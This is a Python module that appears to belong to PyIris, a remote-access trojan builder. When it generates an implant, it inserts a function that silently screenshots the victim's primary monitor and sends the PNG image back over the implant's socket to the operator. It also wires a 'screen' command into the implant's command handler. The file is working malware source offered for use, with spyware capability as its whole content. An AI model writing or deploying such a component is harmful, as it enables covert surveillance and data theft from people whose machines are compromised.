# GUI + CUI
# done
import library.modules.config as config

config.main()
interface = config.interface


def main(option):
    if option == 'generate':
        config.import_statements.append('import mss')
        config.import_statements.append('import mss.tools')
        config.functions.append('''
def screen():
    with mss.mss() as sct:
        monitor = sct.monitors[1]
        im = sct.grab(monitor)
        raw_bytes = mss.tools.to_png(im.rgb, im.size)
        send_all(s,raw_bytes)''')
        config.logics.append('''
            elif command == "screen":
                screen()''')
        config.help_menu['screen'] = 'Takes a screenshot and saves it to in memory file before sending the in memory file to PyIris to download'
    elif option == 'info':
        if interface == "GUI":
            return {
                "Name": "In-memory Screenshot component",
                "OS": "Windows",
                "Required Modules": "mss (external), mss.tools (external)",
                "Commands": "screen",
                "Description": "Takes a screenshot and saves it to in memory file before sending the in memory file to PyIris to download"}
        elif interface == "CUI":
            print('\nName             : In-memory Screenshot component' \
                  '\nOS               : Windows' \
                  '\nRequired Modules : mss (external), mss.tools (external)' \
                  '\nCommands         : screen' \
                  '\nDescription      : Takes a screenshot and saves it to in memory file before sending the in memory file to PyIris to download\n')
